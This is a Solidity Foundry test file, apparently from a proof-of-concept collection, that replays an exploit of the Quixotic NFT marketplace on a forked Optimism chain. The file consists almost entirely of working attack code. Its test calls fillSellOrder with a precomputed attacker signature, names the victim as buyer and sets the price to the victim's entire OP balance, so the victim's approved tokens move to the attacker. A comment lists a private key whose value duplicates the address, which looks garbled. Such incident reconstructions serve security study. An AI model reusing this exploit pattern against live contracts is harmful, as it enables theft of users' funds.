pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";
import "./NFTContract.sol";

//https://www.levi104.com/categories/08-PoC/

contract Attacker is Test {

    NFTContract public nftHelper;
    IQuixotic public quixotic = IQuixotic(address(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6));
    IERC20 public op = IERC20(0x4200000000000000000000000000000000000042);

    // 这里我们用到Narya的默认账户user1：
    // address：0xa1c2b8080ed4b6f56211e0295659ef87dd454b0a884198c10384f230525d4ee8
    // private key: 0xa1c2b8080ed4b6f56211e0295659ef87dd454b0a884198c10384f230525d4ee8
    address public attacker = 0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF;
    address public victim = 0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B;

     function setUp() public {
        vm.createSelectFork("optimism", 13_591_382);
        nftHelper = new NFTContract();

        vm.label(address(nftHelper), "nftHelper");
        vm.label(address(quixotic), "quixotic");
        vm.label(address(op), "op");
    }

    function test_Exploit() public {

        emit log_named_uint("[Before] attacker OP Balance:", op.balanceOf(attacker));
        vm.startBroadcast(attacker);
        uint256 victimBalance = op.balanceOf(victim);

        quixotic.fillSellOrder(
            address(attacker), // seller
            address(nftHelper), // contractAddress
            uint256(1), // tokenId
            uint256(1), // startTime
            uint256(9999999999999999999999999999999999999999), // expiration
            uint256(victimBalance), // price, 黑客需要知道受害者拥有多少op，全部取走
            uint256(1), // quantity
            uint256(1), // createdAtBlockNumber
            address(0x4200000000000000000000000000000000000042), // paymentERC20
            // 这个签名需要到链下进行，计算过程放到了calSignature.sol中
            hex"876048b2a25bc646fc50ad0576a8ebfe6d9e638be0ae35fef67e85761edde71d7642afa2d175d2ad9fb4fb93638b9887886d778064605c6f78653997b404a6a31c", // signature
            address(victim) // buyer，受害者
        );

        vm.stopBroadcast();

        emit log_named_uint("[after] attacker OP Balance:", op.balanceOf(attacker));
    }
   
}